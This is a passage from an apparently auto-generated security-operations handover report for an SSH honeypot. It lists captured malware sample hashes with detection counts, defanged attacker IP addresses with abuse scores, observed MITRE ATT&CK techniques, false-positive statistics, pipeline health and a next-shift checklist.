| `94.102.56[.]99` | 1 | 2026-04-16 17:58 | 2026-04-16 17:58 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `185.93.89[.]190` | NL | Limited Network LTD | **100** ⚠️ | 50 |
| `194.187.176[.]98` | DE | Alpha Strike Labs GmbH | **100** ⚠️ | 29 |
| `185.93.89[.]192` | NL | Limited Network LTD | **100** ⚠️ | 33 |
| `172.174.17[.]234` | US | Microsoft Limited | **100** ⚠️ | 25 |
| `119.148.49[.]82` | BD | Agni Systems Limited, | **100** ⚠️ | 50 |
| `223.109.140[.]250` | CN | China Mobile Communications Corporation | **100** ⚠️ | 15 |
| `43.227.185[.]238` | IN | CUREMED SOLUTIONS PRIVATE LIMITED | **100** ⚠️ | 41 |
| `182.228.117[.]84` | KR | LG POWERCOMM | **100** ⚠️ | 10 |
| `103.143.231[.]2` | US | Hongkong Hongdou Technology Co., Limited | **100** ⚠️ | 14 |
| `45.249.247[.]165` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 25 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 83 cases |
| Tool 34  | Credential Extractor        | ✅ 45 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (34.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 19 recon entry/entries in table (3 group(s) consolidating 13 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-16T19:23:02Z_
